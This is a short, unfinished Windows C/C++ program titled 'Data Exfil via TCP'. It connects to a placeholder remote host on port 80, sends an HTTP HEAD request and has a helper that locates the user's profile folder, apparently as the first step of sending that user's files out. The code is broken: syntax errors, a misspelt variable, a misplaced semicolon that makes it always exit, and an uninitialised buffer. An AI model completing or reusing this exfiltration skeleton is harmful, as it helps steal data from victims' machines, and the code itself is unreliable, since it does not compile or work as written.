// Data Exfil via TCP

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

#define PORT 80
const char szHost[] = "IP_ADDR or URL";

int main(int argc, char const *argv[]) {

  // winsock init
  WSAData wsaData;
  WORD DllVersion = MAKEWORD(2, 1)

  if (WSAStartup(DllVersion, wsaData != 0)) {
    printf "WSAStartup failed";
    exit (EXIT_FAILURE);
  }

  // create socket
  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock < 0){
    printf ("Socket failure");
    exit (EXIT_FAILURE);
  }

  //Get server info
  HOSTENT *host = gethostbyname(szHost);
  if(host == nullptr){
    printf ("Host not found");
    exit (EXIT_FAILURE);
  }

  //Define server info
  SOCKADDR_IN sin;
  ZeroMemory(&sin, sizeof(sin));
  sin.sin_port = htons(PORT);
  sin.sin_family = AF_INET;
  memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr);

  // Connect
  if (connect(sock,(const sockaddr *)&sin, sizeof(sin)) != 0);
    printf ("Connection falied");
    exit (EXIT_FAILURE);

  const char szMsg[] = "HEAD / HTTP/1.0\r\n\r\n";
  if (!send(sock, szMsg, strlen(szMsg), 0)){
    printf ("Send falied");
    exit (EXIT_FAILURE);
  }

  char szBuffer[4096];
  char szTemp[4096];

  while (recv(sock, szTemp, 4096, 0))
    strcat(szBuffer, szTemp);

  printf("%s\n", szBuffer);

  closesocket(sock);
  getchar();

  ExitProcess(EXIT_SUCCESS);


  return 0;
}

char* userDirectory() {
 char* pPath;
 pPath = getenv ("USERPROFILE");

   if (pParth != NULL){
     return pPath;
   } else {
     printf ("pPath Failed");
     perror("")
   }

}
